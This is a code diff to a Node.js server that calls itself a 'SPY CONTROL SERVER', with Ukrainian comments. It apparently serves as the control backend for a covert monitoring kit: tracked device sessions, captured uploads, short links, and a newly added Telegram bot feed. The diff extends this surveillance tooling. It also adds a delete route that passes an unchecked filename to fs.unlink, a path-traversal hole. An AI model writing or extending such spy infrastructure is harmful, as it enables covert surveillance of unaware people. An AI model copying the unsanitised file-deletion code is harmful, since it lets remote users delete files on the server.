@@ -1,18 +1,30 @@
 /**
- * SPY CONTROL SERVER v8.0 ULTIMATE
- * Включає: Socket.IO, File Uploads, Short Links, Real-time Monitoring
+ * SPY CONTROL SERVER v10.0 + TELEGRAM BOT INTEGRATION
+ * Включає: Socket.IO, File Uploads, Short Links, Real-time Monitoring, Telegram Bot
  */
 
 const express = require('express');
 const app = express();
+
+// --- 1. ГЛОБАЛЬНЕ СХОВИЩЕ ДЛЯ БОТА ---
+// Це дозволяє серверу "бачити" файли, які завантажив бот
+global.botFiles = [];
+
+// --- ПІДКЛЮЧЕННЯ БОТА ---
+try {
+    require('./bot.js'); 
+    console.log('✅ Telegram Bot linked successfully');
+} catch (e) {
+    console.log('⚠️ Bot file missing or error:', e.message);
+}
+
 const http = require('http').createServer(app);
 const io = require('socket.io')(http);
 const { v4: uuidv4 } = require('uuid');
 const multer = require('multer');
 const fs = require('fs');
 const path = require('path');
-require('./bot.js'); 
-// 👆 ЦЕ ЗАПУСТИТЬ БОТА РАЗОМ З СЕРВЕРОМ
+
 // --- КОНФІГУРАЦІЯ ---
 const PORT = process.env.PORT || 3000;
 const UPLOAD_DIR = path.join(__dirname, 'public', 'uploads');
@@ -87,7 +99,7 @@ function addFilesToSession(sessionArr, files, type) {
 function parseDevice(ua) {
     if (!ua) return "Unknown";
     if (ua.includes('Android')) return "📱 Android";
-    if (ua.includes('iPhone')) return "📱 iPhone";
+    if (ua.includes('iPhone')) return "🍏 iPhone";
     if (ua.includes('Windows')) return "💻 Windows PC";
     if (ua.includes('Macintosh')) return "💻 Mac";
     if (ua.includes('Linux')) return "🐧 Linux";
@@ -209,7 +221,7 @@ app.post('/session/:id/upload-sounds', upload.array('sounds'), (req, res) => {
     res.json({ success: true });
 });
 
-// 6. Отримання списку сесій (для Watch.html)
+// 6. Отримання списку сесій (для Watch.html) - ОНОВЛЕНО ДЛЯ БОТА
 app.get('/sessions', (req, res) => {
     const list = Object.values(sessions).map(s => {
         // Рахуємо онлайн
@@ -229,7 +241,8 @@ app.get('/sessions', (req, res) => {
         };
     }).sort((a, b) => b.lastActiveAt - a.lastActiveAt);
 
-    res.json(list);
+    // ВІДДАЄМО ТАКОЖ ФАЙЛИ БОТА
+    res.json({ sessions: list, botFiles: global.botFiles || [] });
 });
 
 // 7. Видалення сесії
@@ -251,6 +264,19 @@ app.delete('/session/:id', (req, res) => {
         delete sessions[id];
         console.log(`[SESSION] Deleted: ${id}`);
         res.json({ success: true });
+    } else {
+        res.status(404).json({ error: 'Not found' });
+    }
+});
+
+// 8. Видалення файлу бота
+app.delete('/bot-file/:filename', (req, res) => {
+    const fname = req.params.filename;
+    const idx = global.botFiles.findIndex(f => f.filename === fname);
+    if (idx !== -1) {
+        global.botFiles.splice(idx, 1);
+        fs.unlink(path.join(UPLOAD_DIR, fname), ()=>{});
+        res.json({success:true});
     } else {
         res.status(404).json({ error: 'Not found' });
     }
